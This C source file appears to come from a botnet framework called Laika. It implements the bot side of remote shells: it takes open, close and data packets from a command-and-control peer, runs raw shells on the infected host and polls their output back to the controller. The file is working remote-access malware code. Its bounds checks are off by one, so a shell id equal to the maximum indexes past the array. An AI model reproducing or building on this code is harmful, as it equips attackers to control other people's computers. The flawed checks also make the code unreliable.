#include "shell.h"

#include "bot.h"
#include "lerror.h"
#include "lmem.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id)
{
    if (bot->activeShells++ > LAIKA_MAX_SHELLS)
        LAIKA_ERROR("Failed to allocate new shell, max shells reached!\n");

    /* start shell task */
    if (!bot->shellTask)
        bot->shellTask =
            laikaT_newTask(&bot->tService, LAIKA_SHELL_TASK_DELTA, laikaB_shellTask, (void *)bot);

    return bot->shells[id] = laikaB_newRAWShell(bot, cols, rows, id);
}

void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell)
{
    uint32_t id = shell->id;

    /* tell cnc shell is closed */
    laikaS_startOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
    laikaS_writeInt(&bot->peer->sock, &id, sizeof(uint32_t));
    laikaS_endOutPacket(bot->peer);

    laikaB_freeRAWShell(bot, shell);

    bot->shells[id] = NULL;

    if (--bot->activeShells == 0) {
        /* stop shell task */
        laikaT_delTask(&bot->tService, bot->shellTask);
        bot->shellTask = NULL;
    }
}

/* ====================================[[ Packet Handlers ]]==================================== */

void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
    struct sLaika_shell *shell;
    uint32_t id;
    uint16_t cols, rows;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
    laikaS_readInt(&peer->sock, &cols, sizeof(uint16_t));
    laikaS_readInt(&peer->sock, &rows, sizeof(uint16_t));

    /* check if shell is already open */
    if (id > LAIKA_MAX_SHELLS || (shell = bot->shells[id]))
        LAIKA_ERROR("LAIKAPKT_SHELL_OPEN requested on already open shell!\n");

    /* open shell & if we failed, tell cnc */
    if ((shell = laikaB_newShell(bot, cols, rows, id)) == NULL) {
        laikaS_startOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
        laikaS_writeInt(&bot->peer->sock, &id, sizeof(uint32_t));
        laikaS_endOutPacket(bot->peer);
    }
}

void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
    struct sLaika_shell *shell;
    uint32_t id;

    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));

    /* check if shell is not running */
    if (id > LAIKA_MAX_SHELLS || !(shell = bot->shells[id]))
        return;

    /* close shell */
    laikaB_freeShell(bot, shell);
}

void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
{
    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
    struct sLaika_shell *shell;
    uint32_t id;

    /* read data buf */
    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
    laikaS_read(&peer->sock, buf, sz - sizeof(uint32_t));

    /* sanity check shell */
    if (id > LAIKA_MAX_SHELLS || !(shell = bot->shells[id]))
        LAIKA_ERROR("LAIKAPKT_SHELL_DATA requested on unopened shell!\n");

    /* write to shell */
    laikaB_writeShell(bot, shell, buf, sz - sizeof(uint32_t));
}

void laikaB_shellTask(struct sLaika_taskService *service, struct sLaika_task *task,
                      clock_t currTick, void *uData)
{
    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
    struct sLaika_shell *shell;
    int i;

    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
        if ((shell = bot->shells[i]))
            laikaB_readShell(bot, shell);
    }
}